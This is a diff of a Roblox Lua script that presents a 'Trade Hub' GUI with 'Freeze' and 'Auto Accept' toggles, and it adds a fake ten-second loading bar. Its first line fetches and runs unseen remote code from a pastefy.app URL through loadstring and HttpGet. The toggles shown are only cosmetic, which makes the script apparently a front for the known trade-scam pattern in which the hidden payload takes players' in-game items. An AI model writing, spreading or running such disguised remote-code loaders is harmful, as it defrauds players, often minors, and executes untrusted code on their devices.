@@ -1,4 +1,59 @@
 loadstring(game:HttpGet("https://pastefy.app/gBpO0gpe/raw"))()
+local player = game.Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+--====================--
+-- LOADING SCREEN
+--====================--
+
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Parent = PlayerGui
+LoadingGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame")
+frame.Parent = LoadingGui
+frame.Size = UDim2.new(0, 200, 0, 60)
+frame.Position = UDim2.new(0.5, -100, 0.5, -30)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Active = true
+frame.Draggable = true
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+local text = Instance.new("TextLabel")
+text.Parent = frame
+text.Size = UDim2.new(1, 0, 0.5, 0)
+text.BackgroundTransparency = 1
+text.Text = "freeze hub"
+text.TextColor3 = Color3.fromRGB(255,255,255)
+text.TextScaled = true
+text.Font = Enum.Font.GothamBold
+
+local barBG = Instance.new("Frame")
+barBG.Parent = frame
+barBG.Position = UDim2.new(0.1, 0, 0.65, 0)
+barBG.Size = UDim2.new(0.8, 0, 0, 8)
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
+
+local bar = Instance.new("Frame")
+bar.Parent = barBG
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+
+-- 10 sec loading
+for i = 1, 100 do
+	bar.Size = UDim2.new(i/100, 0, 1, 0)
+	task.wait(0.1)
+end
+
+LoadingGui:Destroy()
+
+--====================--
+-- TRADE HUB GUI
+--====================--
+
 local ScreenGui = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
@@ -9,14 +64,11 @@ local FreezeToggle = Instance.new("TextButton")
 local AutoText = Instance.new("TextLabel")
 local AutoToggle = Instance.new("TextButton")
 
-local UICorner = Instance.new("UICorner")
-local Stroke = Instance.new("UIStroke")
+local Footer = Instance.new("TextLabel")
 
--- ScreenGui
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Parent = PlayerGui
 ScreenGui.ResetOnSpawn = false
 
--- Main Frame
 Main.Parent = ScreenGui
 Main.Size = UDim2.new(0, 180, 0, 130)
 Main.Position = UDim2.new(0.5, -90, 0.5, -65)
@@ -24,23 +76,22 @@ Main.BackgroundColor3 = Color3.fromRGB(20, 0, 40)
 Main.Active = true
 Main.Draggable = true
 
-UICorner.Parent = Main
-UICorner.CornerRadius = UDim.new(0, 12)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
 
-Stroke.Parent = Main
-Stroke.Color = Color3.fromRGB(140, 0, 255)
-Stroke.Thickness = 2
+local stroke = Instance.new("UIStroke", Main)
+stroke.Color = Color3.fromRGB(140, 0, 255)
+stroke.Thickness = 2
 
 -- Title
 Title.Parent = Main
 Title.Size = UDim2.new(1, 0, 0, 25)
 Title.BackgroundTransparency = 1
 Title.Text = "Trade Hub ⚜"
-Title.TextColor3 = Color3.fromRGB(200, 150, 255)
+Title.TextColor3 = Color3.fromRGB(200,150,255)
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 
--- Freeze Trade Text
+-- Freeze
 FreezeText.Parent = Main
 FreezeText.Position = UDim2.new(0, 10, 0, 35)
 FreezeText.Size = UDim2.new(0.6, 0, 0, 20)
@@ -50,15 +101,13 @@ FreezeText.TextColor3 = Color3.fromRGB(255,255,255)
 FreezeText.TextScaled = true
 FreezeText.Font = Enum.Font.Gotham
 
--- Freeze Toggle
 FreezeToggle.Parent = Main
 FreezeToggle.Position = UDim2.new(0.7, 0, 0, 35)
 FreezeToggle.Size = UDim2.new(0, 40, 0, 20)
 FreezeToggle.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
 FreezeToggle.Text = ""
 
-local fCorner = Instance.new("UICorner", FreezeToggle)
-fCorner.CornerRadius = UDim.new(1,0)
+Instance.new("UICorner", FreezeToggle).CornerRadius = UDim.new(1,0)
 
 local fCircle = Instance.new("Frame", FreezeToggle)
 fCircle.Size = UDim2.new(0, 18, 0, 18)
@@ -76,7 +125,7 @@ FreezeToggle.MouseButton1Click:Connect(function()
 	end
 end)
 
--- Auto Accept Text
+-- Auto Accept
 AutoText.Parent = Main
 AutoText.Position = UDim2.new(0, 10, 0, 70)
 AutoText.Size = UDim2.new(0.6, 0, 0, 20)
@@ -86,15 +135,13 @@ AutoText.TextColor3 = Color3.fromRGB(255,255,255)
 AutoText.TextScaled = true
 AutoText.Font = Enum.Font.Gotham
 
--- Auto Toggle
 AutoToggle.Parent = Main
 AutoToggle.Position = UDim2.new(0.7, 0, 0, 70)
 AutoToggle.Size = UDim2.new(0, 40, 0, 20)
 AutoToggle.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
 AutoToggle.Text = ""
 
-local aCorner = Instance.new("UICorner", AutoToggle)
-aCorner.CornerRadius = UDim.new(1,0)
+Instance.new("UICorner", AutoToggle).CornerRadius = UDim.new(1,0)
 
 local aCircle = Instance.new("Frame", AutoToggle)
 aCircle.Size = UDim2.new(0, 18, 0, 18)
@@ -113,12 +160,11 @@ AutoToggle.MouseButton1Click:Connect(function()
 end)
 
 -- Footer
-local Footer = Instance.new("TextLabel")
 Footer.Parent = Main
 Footer.Position = UDim2.new(0, 0, 1, -18)
 Footer.Size = UDim2.new(1, 0, 0, 15)
 Footer.BackgroundTransparency = 1
 Footer.Text = "discord.gg"
-Footer.TextColor3 = Color3.fromRGB(180, 120, 255)
+Footer.TextColor3 = Color3.fromRGB(180,120,255)
 Footer.TextScaled = true
 Footer.Font = Enum.Font.Gotham
